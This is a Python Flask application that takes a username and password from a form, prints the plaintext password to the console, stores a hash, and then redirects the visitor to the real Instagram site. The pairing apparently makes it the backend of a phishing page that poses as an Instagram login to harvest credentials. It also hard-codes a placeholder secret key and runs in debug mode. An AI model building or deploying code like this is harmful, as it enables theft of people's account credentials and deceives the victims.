from flask import Flask, render_template, request, redirect, flash, url_for
from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = 'your_secret_key'  # Needed for flash messaging

# Database configuration
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
migrate = Migrate(app, db)  # Initialize Flask-Migrate

# User model for storing users in the database
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(255), unique=True, nullable=False)
    password_hash = db.Column(db.String(255), nullable=False)

    def __repr__(self):
        return f'<User {self.username}>'

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        # Print the username and password
        print(f"Username: {username}, Password: {password}")

        # Validate that username and password are provided
        if not username or not password:
            flash("Error: Please provide both a username and a password.", "error")
            return redirect(url_for('index'))

        # Check if the username already exists in the database
        user_exists = User.query.filter_by(username=username).first()
        if user_exists:
            flash("Error: Username already exists. Please choose another one.", "error")
            return redirect(url_for('index'))

        # Hash the password before storing
        password_hash = generate_password_hash(password)

        # Create a new user instance
        new_user = User(username=username, password_hash=password_hash)

        try:
            # Add the user to the database
            db.session.add(new_user)
            db.session.commit()

            flash("User registered successfully!", "success")
            # Redirect to the official Instagram page after successful registration
            return redirect("https://www.instagram.com/")
        except Exception as e:
            db.session.rollback()
            flash(f"Error occurred while registering: {e}", "error")
            return redirect(url_for('index'))

    return render_template('index.html')

@app.route('/instagram')
def instagram():
    return redirect("https://www.instagram.com/")

if __name__ == '__main__':
    with app.app_context():
        db.create_all()  # Create the database table if it doesn't exist
    app.run(debug=True)
